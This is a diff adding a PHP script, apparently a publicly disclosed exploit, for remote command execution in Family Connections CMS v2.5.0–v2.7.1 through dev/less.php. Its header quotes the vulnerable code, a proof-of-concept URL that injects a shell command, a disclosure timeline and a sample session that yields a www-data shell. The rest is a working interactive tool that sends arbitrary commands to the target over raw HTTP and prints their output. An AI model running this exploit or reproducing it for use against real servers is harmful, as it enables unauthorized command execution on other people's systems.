@@ -1,0 +1,179 @@
+<?php
+/*
+Family connections CMS v2.5.0-v2.7.1 remote command execution exploit
+vendor_________: https://www.familycms.com/
+software link__: https://www.familycms.com/download.php
+author_________: mr_me::rwx kru
+email__________: steventhomasseeley!gmail!com
+----------------------------------
+php.ini requirements: 
+register_globals=On
+register_argc_argv=Off
+
+This bug is almost identical to CVE-2005-2651
+poc: http://192.168.220.128/[path]/dev/less.php?argv[1]=|id;
+
+The vulnerable code is on lines 20-36 in ./dev/less.php:
+-->
+$theme = isset($argv[1]) ? $argv[1] : 'default';
+
+system("clear");
+
+if (file_exists("$dir/themes/$theme/style.css"))
+{
+    echo "\n[ themes/$theme/style.css ] already exists.\n\n";
+    echo "Overwrite [ y/n ] ? ";
+    $handle = fopen ("php://stdin","r");
+    $line = fgets($handle);
+    if (trim($line) != 'y')
+    {
+        exit;
+    }
+}
+
+$worked = system("php -q ~/bin/lessphp/lessc $dir/themes/$theme/dev.less > $dir/themes/$theme/style.css");
+<--
+
+Timeline:
+- Nov 28th discovered and reported using ticket 407 (http://sourceforge.net/apps/trac/fam-connections/ticket/407)
+- Dec 2nd, vendors stated that they will fix the issue
+- Dec 4th, vendors keep pushing back release 2.7.2 with no proper planned date
+- Dec 4th, Public disclosure
+-----------------------------------
+mr_me@gliese:~/pentest/web/0day/fcms$ php poc.php -t 192.168.220.128 /webapps/FCMS_2.7.1/ -p 127.0.0.1:8080
+
+--------------------------------------------------------------------------------
+Family Connections CMS v2.5.0-v2.7.1 (less.php) remote command execution exploit
+by mr_me of rwx kru - net-ninja.net / rwx.biz.nf
+--------------------------------------------------------------------------------
+(+) Setting the proxy to 127.0.0.1:8080
+
+mr_me@192.168.220.128# id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+mr_me@192.168.220.128# uname -a
+Linux steve-web-server 2.6.35-31-generic #62-Ubuntu SMP Tue Nov 8 14:00:30 UTC 2011 i686 GNU/Linux
+mr_me@192.168.220.128# q
+*/
+
+print_r("
+--------------------------------------------------------------------------------
+Family Connections CMS v2.5.0-v2.7.1 (less.php) remote command execution exploit
+by mr_me of rwx kru - net-ninja.net / rwx.biz.nf
+--------------------------------------------------------------------------------
+");
+
+if ($argc < 3) {
+print_r("
+-----------------------------------------------------------------------------
+Usage: php ".$argv[0]." -t <host:ip> -d <path> OPTIONS
+host:      target server (ip/hostname)
+path:      directory path to wordpress
+Options:
+ -p[ip:port]: specify a proxy
+Example:
+php ".$argv[0]." -t 192.168.1.5 -d /wp/ -p 127.0.0.1:8080
+php ".$argv[0]." -t 192.168.1.5 -d /wp/
+-----------------------------------------------------------------------------
+"); die; 
+}
+
+error_reporting(7);
+ini_set("max_execution_time", 0);
+ini_set("default_socket_timeout", 5);
+
+$proxy_regex = "(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b)";
+
+function setArgs($argv){
+	$_ARG = array();
+	foreach ($argv as $arg){
+		if (ereg("--([^=]+)=(.*)", $arg, $reg)){
+			$_ARG[$reg[1]] = $reg[2];
+		}elseif(ereg("^-([a-zA-Z0-9])", $arg, $reg)){
+			$_ARG[$reg[1]] = "true";
+		}else {
+			$_ARG["input"][] = $arg;
+		}
+	}
+	return $_ARG;
+}
+
+
+$myArgs = setArgs($argv);
+$host = $myArgs["input"]["1"];
+$path = $myArgs["input"]["2"];
+
+if (strpos($host, ":") == true){
+	$hostAndPort = explode(":",$myArgs["input"][1]);
+	$host = $hostAndPort[0];
+	$port = (int)$hostAndPort[1];
+}else{
+	$port = 80;
+}
+
+
+if(strcmp($myArgs["p"],"true") === 0){
+	$proxyAndPort = explode(":",$myArgs["input"][3]);
+	$proxy = $proxyAndPort[0];
+	$pport = $proxyAndPort[1];
+	echo "(+) Setting the proxy to ".$proxy.":".$pport."\r\n";
+}else{
+    	echo "(-) Warning, a proxy was not set\r\n";
+}
+
+// rgods sendpacketii() function
+function sendpacket($packet){
+	global $myArgs, $proxy, $host, $pport, $port, $html, $proxy_regex;
+	if (strcmp($myArgs["p"],"true") != 0) {
+		$ock = fsockopen(gethostbyname($host),$port);
+		if (!$ock) {
+			echo "(-) No response from ".$host.":".$port; die;
+		}
+	}
+	else {
+		$c = preg_match($proxy_regex,$proxy);
+		if (!$c) {
+			echo "(-) Not a valid proxy...\n"; die;
+		}
+		$ock=fsockopen($proxy,$pport);
+		if (!$ock) {
+			echo "(-) No response from proxy..."; die;
+		}
+	}
+	fputs($ock,$packet);
+	if ($proxy == "") {
+		$html = "";
+		while (!feof($ock)) {
+			$html .= fgets($ock);
+		}
+	}else {
+		$html = "";
+		while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a), $html))) {
+			$html .= fread($ock,1);
+		}
+	}
+	fclose($ock);
+}
+
+if (strcmp($myArgs["p"], "true") != 0) {$p = $path;} else {$p = "http://".$host.":".$port.$path;}
+
+function read(){
+	$fp1 = fopen("/dev/stdin", "r");
+	$input = fgets($fp1, 255);
+	fclose($fp1);
+	return $input;
+}
+
+while ($cmd != "q"){
+	echo "\n".get_current_user()."@".$host."# ";
+	$cmd = trim(read());
+	$c = urlencode("echo fcms_start;".$cmd.";echo fcms_end");
+	$packet = "GET ".$p."dev/less.php?argv[1]=|".$c."; HTTP/1.1\r\n";
+	$packet .= "host: ".$host."\r\n\r\n";
+	if ($cmd != "q"){
+		sendpacket($packet);
+		$html = explode("fcms_start",$html);
+		$___response = explode("fcms_end",$html[2]);
+		echo (trim($___response[0]));
+    	}
+}
+?>
